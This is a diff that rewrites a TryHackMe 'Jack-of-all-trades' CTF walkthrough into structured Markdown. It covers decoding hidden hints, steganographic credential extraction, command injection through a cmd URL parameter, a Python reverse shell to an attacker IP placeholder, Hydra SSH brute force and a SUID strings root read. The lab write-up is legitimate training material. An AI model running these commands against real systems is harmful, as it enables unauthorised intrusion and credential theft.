@@ -1,124 +1,233 @@
-Jack in the Box — CTF Walkthrough
-1. Initial Enumeration
+# 🃏 TryHackMe — Jack-of-all-trades
 
-I began with an Nmap scan, which revealed an unusual configuration:
+> **Difficulty:** Easy | **OS:** Linux | **Category:** Steganography / Web / Privilege Escalation
+> **Author:** Aryan Barkhordar
 
-22 (HTTP)
-80 (SSH)
+---
 
-<img width="771" height="246" alt="Nmap scan" src="https://github.com/user-attachments/assets/f3733651-90d8-42ac-8822-3943600d2656" />
+## Table of Contents
 
-This port inversion was a nice quirk of the challenge.
-Navigating to port 22 in the browser, I found the website themed around Jack, while port 80 was hosting SSH.
+- [Overview](#overview)
+- [Reconnaissance](#reconnaissance)
+  * [Port Scanning](#port-scanning)
+  * [Web Enumeration](#web-enumeration)
+- [Exploitation](#exploitation)
+  * [Source Code Analysis — Hidden Page & Encoded Strings](#source-code-analysis--hidden-page--encoded-strings)
+  * [Decoding the Hint — Base32 → Hex → ROT13](#decoding-the-hint--base32--hex--rot13)
+  * [Steganography — Credential Extraction from Image](#steganography--credential-extraction-from-image)
+  * [RCE via URL Parameter Injection](#rce-via-url-parameter-injection)
+  * [Reverse Shell](#reverse-shell)
+- [Post-Exploitation](#post-exploitation)
+  * [Password List Discovery](#password-list-discovery)
+  * [SSH Brute Force — Hydra](#ssh-brute-force--hydra)
+  * [User Flag](#user-flag)
+- [Privilege Escalation](#privilege-escalation)
+  * [SUID Binary Enumeration](#suid-binary-enumeration)
+  * [Root Flag via `strings`](#root-flag-via-strings)
+- [Flags](#flags)
+- [Summary](#summary)
 
-<img width="1916" height="959" alt="Website" src="https://github.com/user-attachments/assets/82427b98-c1b0-4cfe-b196-eb9e4f5309d4" />
+---
 
-2. Discovering Hidden Paths
+## Overview
 
-Using Inspect Element, I noticed a reference to a hidden page:
-/recovery.php
+**Jack-of-all-trades** is a TryHackMe machine with a deliberately inverted port configuration — HTTP runs on port 22 and SSH on port 80. The attack chain involves layered encoding challenges to extract credentials hidden within a steganographic image, followed by exploitation of a command injection vulnerability in a CMS recovery panel. Post-exploitation reveals a password list, which Hydra uses to brute-force SSH access. Privilege escalation abuses a SUID `strings` binary to read the root flag directly.
 
-Alongside it was a Base64-encoded string. I decoded this in CyberChef, revealing what looked like a password, however, it did not work on the recovery login page.
+---
 
-<img width="1220" height="420" alt="inspect on main page" src="https://github.com/user-attachments/assets/b0f677fe-8520-4218-a89a-979be63e7887" />
-<img width="1537" height="586" alt="cyberchef-1" src="https://github.com/user-attachments/assets/9ecb62d2-78ea-4ad3-ba79-e387228e0d1b" />
+## Reconnaissance
 
+### Port Scanning
 
-3. Digging Into recovery.php
+An initial `nmap` scan revealed an unusual port configuration:
 
-I checked the page source of /recovery.php and found another encoded string. 
+```
+PORT   STATE SERVICE
+22/tcp open  http
+80/tcp open  ssh
+```
 
-<img width="1916" height="431" alt="recoveryphp" src="https://github.com/user-attachments/assets/d0b0a9c6-40bb-4831-948e-373b420bea89" />
+> **Key Finding:** The services were intentionally swapped — HTTP was running on port `22` and SSH on port `80`. Navigating to `http://<TARGET>:22` served the website; SSH was accessible at `<TARGET>:80`.
 
-Trying to decode it revealed:
+---
 
-Base32 → produced a hex string
+### Web Enumeration
 
-Hex → decoded into a ROT13 string
+Browsing to `http://<TARGET>:22` presented a Jack-themed landing page. No obvious attack surface was visible from the page itself, prompting a closer inspection of the page source.
 
-ROT13 → revealed the hidden message:
+---
 
-“Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S”
+## Exploitation
 
-This strongly suggested the password was concealed within one of the site’s images.
+### Source Code Analysis — Hidden Page & Encoded Strings
 
-<img width="1534" height="595" alt="cyberchef-2" src="https://github.com/user-attachments/assets/3c002510-94ce-4874-b236-39848a1fe00d" />
+Inspecting the page source via browser DevTools revealed two items of interest:
 
-he hint provided earlier — bit.ly/2TvYQ2S — redirected to a wikipedia page of a dinosaur species. This wasn’t directly useful, but it suggested I should focus on images for the next stage. Because of the dinosaur reference, I initially targeted stego.jpg, assuming it was the intended file.
+- A reference to a hidden path: `/recovery.php`
+- A **Base64-encoded string** embedded in an HTML comment
 
-I attempted:
+The Base64 string was decoded using CyberChef, revealing what appeared to be a password. However, this credential did not authenticate successfully on the `/recovery.php` login form.
 
-<img width="347" height="167" alt="stegseek" src="https://github.com/user-attachments/assets/87f81cd2-cca6-4685-ba2a-348910ea1436" />
+---
 
-This returned:
+### Decoding the Hint — Base32 → Hex → ROT13
 
-“Hehe. Gotcha! You're on the right path, but wrong image!”
+The page source of `/recovery.php` contained a further encoded string. Decoding it required a multi-stage operation:
 
-So I moved on to header.jpg, using the decoded password and a different tool named steghide. This time, steghide successfully extracted a file named cms.creds, containing the credentials for /recovery.php.
+```
+Base32 → Hex → ROT13
+```
 
-<img width="383" height="185" alt="steghide" src="https://github.com/user-attachments/assets/45930085-5e4f-4d33-86d6-6a1bf1e69896" />
+The final decoded output read:
 
-5. Gaining Access & Achieving RCE
+> *"Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S"*
 
-After authenticating to the recovery page, I saw this message:
+> **Key Observation:** The bit.ly link redirected to a Wikipedia article about a dinosaur species — a hint toward steganography being involved, and specifically towards one of the images on the homepage.
 
-"GET me a 'cmd' and I'll run it for you Future-Jack."
+---
 
-This hinted at a command injection/RCE vulnerability.
+### Steganography — Credential Extraction from Image
 
-I tested it by appending a command parameter to the URL:
+Two images were present on the homepage: `stego.jpg` and `header.jpg`.
 
-<img width="1357" height="40" alt="cmdinjct" src="https://github.com/user-attachments/assets/5ab19452-7fc9-49f2-bc74-0dd3c0aa1b90" />
+`stegseek` was attempted against `stego.jpg` first:
 
-A directory listing appeared—RCE confirmed.
+```
+stegseek stego.jpg /usr/share/wordlists/rockyou.txt
+```
 
-<img width="609" height="40" alt="listing" src="https://github.com/user-attachments/assets/f6410945-7ba9-47fe-a869-b16717af31d2" />
+The tool returned an embedded decoy message indicating the wrong image was targeted.
 
-Next, I executed a Python reverse shell payload in the url, which successfully connected back to my machine, granting me a shell on the target.
+`steghide` was then used against `header.jpg` with the password extracted earlier from the Base64 decode:
 
-"export RHOST="ATTACKER IP";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"
+```
+steghide extract -sf header.jpg
+```
 
-<img width="531" height="133" alt="revshell" src="https://github.com/user-attachments/assets/b1a166c5-5460-459c-a295-7faa49379b73" />
+This successfully extracted a file named `cms.creds`, containing the valid credentials for `/recovery.php`.
 
-6. Enumerating the System
+---
 
-Inside /home, I discovered jacks_password_list, which contained a list of possible SSH passwords for user jack.
+### RCE via URL Parameter Injection
 
-I copied the file to my machine and used Hydra to brute-force SSH:
+After authenticating to `/recovery.php`, the panel displayed the following message:
 
-hydra -l jack -P jacks_password_list ssh://<IP>
+> *"GET me a 'cmd' and I'll run it for you Future-Jack."*
 
-Hydra identified the correct password, and I logged in as jack.
+This explicitly indicated a `GET` parameter named `cmd` was being passed directly to system execution. Testing confirmed arbitrary command injection:
 
-<img width="954" height="209" alt="hydra" src="https://github.com/user-attachments/assets/d1f4c7eb-f67b-4420-936f-d85cb15b5a3c" />
+```
+http://<TARGET>:22/recovery.php?cmd=ls
+```
 
-In Jack’s home directory, I found user.jpg.
-After transferring it using scp, opening the file revealed the user flag.
+A directory listing was returned — Remote Code Execution was confirmed.
 
-<img width="913" height="113" alt="scp" src="https://github.com/user-attachments/assets/2796d375-5470-424e-933e-c67a1475b578" />
-<img width="1145" height="523" alt="user" src="https://github.com/user-attachments/assets/ae84b572-d94d-4756-a9ca-04e1ab7def4f" />
+---
 
-7. Privilege Escalation
+### Reverse Shell
 
-To escalate privileges, I first checked sudo permissions:
+A Python reverse shell payload was executed via the `cmd` parameter:
 
-"sudo -l"
+```
+export RHOST="<ATTACKER IP>";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
 
-Jack had no sudo access.
-Next, I searched for SUID binaries:
+With a Netcat listener running on port 4444, the shell connected successfully, providing an interactive session on the target.
 
-"find / -type f -user root -perm -u=s 2>/dev/null"
+---
 
-One interesting result was:
+## Post-Exploitation
 
+### Password List Discovery
+
+Exploring `/home` revealed a file named `jacks_password_list` — a plaintext list of potential SSH passwords for the user `jack`.
+
+The file was exfiltrated to the attacker machine for offline use.
+
+---
+
+### SSH Brute Force — Hydra
+
+`Hydra` was used to brute-force SSH on port 80 using the recovered password list:
+
+```
+hydra -l jack -P jacks_password_list ssh://<TARGET> -s 80
+```
+
+Hydra identified the valid password. SSH access was established as `jack`.
+
+---
+
+### User Flag
+
+Jack's home directory contained a file named `user.jpg`. The file was transferred back to the attacker machine via `scp`:
+
+```
+scp -P 80 jack@<TARGET>:~/user.jpg .
+```
+
+Opening the image revealed the **user flag** embedded visually within it.
+
+---
+
+## Privilege Escalation
+
+### SUID Binary Enumeration
+
+With a shell as `jack`, standard privilege escalation checks were run:
+
+```
+sudo -l
+```
+
+Jack had no sudo permissions. A search for SUID binaries followed:
+
+```
+find / -type f -user root -perm -u=s 2>/dev/null
+```
+
+The output included:
+
+```
 /usr/bin/strings
+```
 
-Since strings was running with root privileges, I used it to read the root flag directly:
+> **Key Observation:** The `strings` binary was configured with the SUID bit set, meaning it executes with root-level permissions regardless of the calling user. Since `strings` can read arbitrary file contents, it can be used to access any file on the system as root.
 
-"strings /root/root.txt"
+---
 
-This printed the root flag, completing the challenge.
+### Root Flag via `strings`
 
-<img width="611" height="276" alt="strings binary" src="https://github.com/user-attachments/assets/fe6c08fb-e655-4769-9caf-1b99e267d6aa" />
-<img width="754" height="135" alt="root flag" src="https://github.com/user-attachments/assets/b99427f4-611b-4223-a082-8d1a00d35e7a" />
+The root flag was read directly using the SUID `strings` binary:
 
+```
+strings /root/root.txt
+```
+
+The flag was printed to stdout, completing the machine.
+
+---
+
+## Flags
+
+| Flag        | Value           |
+| ----------- | --------------- |
+| 🏳️ **User** | `THM{REDACTED}` |
+| 🚩 **Root**  | `THM{REDACTED}` |
+
+---
+
+## Summary
+
+| Stage                    | Technique                                                                         |
+| ------------------------ | --------------------------------------------------------------------------------- |
+| **Recon**                | `nmap` scan, inverted port discovery (HTTP:22, SSH:80)                            |
+| **OSINT**                | Source code inspection, multi-layer encoding (Base64, Base32, Hex, ROT13)         |
+| **Steganography**        | `steghide` extracts `cms.creds` from `header.jpg`                                 |
+| **Initial Access**       | RCE via `?cmd=` GET parameter injection on `/recovery.php`                        |
+| **Lateral Movement**     | `jacks_password_list` → Hydra SSH brute force → shell as `jack`                  |
+| **Privilege Escalation** | SUID `/usr/bin/strings` → root file read                                          |
+
+---
+
+*Writeup by Aryan Barkhordar*
